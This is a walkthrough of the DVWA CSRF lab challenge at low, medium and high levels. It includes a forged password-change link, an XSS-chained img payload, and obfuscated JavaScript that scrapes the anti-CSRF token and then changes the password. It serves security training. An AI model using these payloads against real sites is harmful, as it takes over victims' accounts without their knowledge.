# CSRF

Objective

Your task is to make the current user change their own password, without them
knowing about their actions, using a CSRF attack.

**I'd highly recommend finishing the XSS challenges first.**

## low

Here is the malicious link we could cheat others to click:  
[http://localhost:9999/vulnerabilities/csrf/?password_new=qwerty&password_conf=qwerty&Change=Change]()

In terms of DVWA, this link only works when the user has retrieved his/her
PHPSESSID, in another word, he/she should've already logged in.

## medium

This level added cross site detection. It seems that we should use some other
vulnerabilities like XSS.

For example, we could craft a link to the XSS (Reflected) challenge and trigger
the malicious one:  
`<img src="http://localhost:9999/vulnerabilities/csrf/?password_new=qwerty&password_conf=qwerty&Change=Change">`

So our link should be like this:  
[http://localhost:9999/vulnerabilities/xss_r/?name=%3Cimg%20src%3D%22http%3A%2F%2Flocalhost%3A9999%2Fvulnerabilities%2Fcsrf%2F%3Fpassword_new%3Dqwerty%26password_conf%3Dqwerty%26Change%3DChange%22%3E]()

To verify our link, log into the site as admin and access the link above, then
you can log out and check if the password has been changed to "qwerty" or
anything else you want.

## high

Our goal in this level is to bypass a anti-CSRF token.

In the source view of webpage we can see a hidden POST param called 
`user_token`, which is already set to some 32-byte hex value by the server. 
Each time we access the webpage, "user_token" changes.

The purpose of user token is to ensure that any request to the API is made by a
human from the webpage, not from some outside links.  

Just like the medium level, we need another vulnerability, to be specific, XSS.
What we're doing is to imitate a human by using AJAX.
Here's the js source to do that:  
```js
a = new XMLHttpRequest();
a.open('GET', 'http://localhost:9999/vulnerabilities/csrf/');
a.send();
a.onload = () => {
  if (a.readyState == 4 && a.status == 200) {
    t = a.response.substr(a.response.search(/[0-9a-zA-Z]{32}/), 32);
    b = new XMLHttpRequest();
    b.open('GET', 'http://localhost:9999/vulnerabilities/csrf/?password_new=qwerty&password_conf=qwerty&Change=Change&user_token=' + t);
    b.send();
  } else {
    console.log(a.status);
  }
};
```

Don't forget to bypass the XSS filter in the high level of XSS challenge. If you 
don't know what to do, refer to `XSS_Reflected.md` for more infomation.
```js
<img src="" onerror="javascri&#112;t:a=new XMLHtt&#112;Request();a.o&#112;en('GET','htt&#112;://localhost:9999/vulnerabilities/csrf/');a.send();a.onload=()=>{if(a.readyState==4&&a.status==200){b=new XMLHtt&#112;Request();b.o&#112;en('GET','htt&#112;://localhost:9999/vulnerabilities/csrf/?&#112;assword_new=qwerty&&#112;assword_conf=qwerty&Change=Change&user_token='+a.res&#112;onse.substr(a.res&#112;onse.search(/[0-9a-zA-Z]{32}/),32));b.send();}else{console.log(a.status);}};">
```

URL encode it and we get our CSRF link:  
[http://localhost:9999/vulnerabilities/xss_r/?name=%3Cimg%20src%3D%22%22%20onerror%3D%22javascri%26%23112%3Bt%3Aa%3Dnew%20XMLHtt%26%23112%3BRequest()%3Ba.o%26%23112%3Ben('GET'%2C'htt%26%23112%3B%3A%2F%2Flocalhost%3A9999%2Fvulnerabilities%2Fcsrf%2F')%3Ba.send()%3Ba.onload%3D()%3D%3E%7Bif(a.readyState%3D%3D4%26%26a.status%3D%3D200)%7Bb%3Dnew%20XMLHtt%26%23112%3BRequest()%3Bb.o%26%23112%3Ben('GET'%2C'htt%26%23112%3B%3A%2F%2Flocalhost%3A9999%2Fvulnerabilities%2Fcsrf%2F%3F%26%23112%3Bassword_new%3Dqwerty%26%26%23112%3Bassword_conf%3Dqwerty%26Change%3DChange%26user_token%3D'%2Ba.res%26%23112%3Bonse.substr(a.res%26%23112%3Bonse.search(%2F%5B0-9a-zA-Z%5D%7B32%7D%2F)%2C32))%3Bb.send()%3B%7Delse%7Bconsole.log(a.status)%3B%7D%7D%3B%22]()  
Log out and check whether you've successfully changed the password to "qwerty" 
or anything else you want.
